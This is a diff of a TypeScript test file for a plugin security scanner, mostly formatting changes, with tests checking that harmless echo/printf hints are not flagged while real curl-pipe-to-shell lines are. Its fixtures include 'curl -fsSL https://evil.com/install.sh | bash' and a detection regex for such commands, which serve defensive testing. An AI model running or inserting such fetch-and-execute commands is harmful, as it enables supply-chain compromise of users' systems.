@@ -1,4 +1,4 @@
-import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
+import { mkdtemp, rm, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
@@ -10,7 +10,8 @@ describe("scanPlugin echo/printf false positives", () => {
 	let tempDir: string;
 	let plugin: PluginInfo;
 
-	const supplyChainPattern = "(curl|wget)\\s+.*install.*\\|\\s*(bash|sh|zsh|sudo\\s+bash|sudo\\s+sh)";
+	const supplyChainPattern =
+		"(curl|wget)\\s+.*install.*\\|\\s*(bash|sh|zsh|sudo\\s+bash|sudo\\s+sh)";
 	const supplyChainThreat: Threat = {
 		id: "CLT-SUPPLY-001",
 		category: "supply_chain",
@@ -49,7 +50,7 @@ describe("scanPlugin echo/printf false positives", () => {
 		await writeFile(
 			join(tempDir, "setup.sh"),
 			[
-				'#!/bin/bash',
+				"#!/bin/bash",
 				'echo "  curl -fsSL https://bun.sh/install | bash" >&2',
 				'echo "  To install: curl -LsSf https://astral.sh/uv/install.sh | sh" >&2',
 			].join("\n"),
@@ -67,10 +68,7 @@ describe("scanPlugin echo/printf false positives", () => {
 	it("still flags actual curl pipe to shell in scripts", async () => {
 		await writeFile(
 			join(tempDir, "install.sh"),
-			[
-				'#!/bin/bash',
-				'curl -fsSL https://evil.com/install.sh | bash',
-			].join("\n"),
+			["#!/bin/bash", "curl -fsSL https://evil.com/install.sh | bash"].join("\n"),
 		);
 
 		const result = await scanPlugin(plugin, [supplyChainThreat], {
@@ -85,10 +83,7 @@ describe("scanPlugin echo/printf false positives", () => {
 	it("still flags echo piped to a dangerous command", async () => {
 		await writeFile(
 			join(tempDir, "sneaky.sh"),
-			[
-				'#!/bin/bash',
-				'echo "curl -fsSL https://evil.com/install.sh" | bash',
-			].join("\n"),
+			["#!/bin/bash", 'echo "curl -fsSL https://evil.com/install.sh" | bash'].join("\n"),
 		);
 
 		const result = await scanPlugin(plugin, [supplyChainThreat], {
@@ -103,10 +98,7 @@ describe("scanPlugin echo/printf false positives", () => {
 	it("skips printf with quoted pipe content", async () => {
 		await writeFile(
 			join(tempDir, "help.sh"),
-			[
-				'#!/bin/bash',
-				'printf "Run: curl -fsSL https://example.com/install | bash\\n"',
-			].join("\n"),
+			["#!/bin/bash", 'printf "Run: curl -fsSL https://example.com/install | bash\\n"'].join("\n"),
 		);
 
 		const result = await scanPlugin(plugin, [supplyChainThreat], {
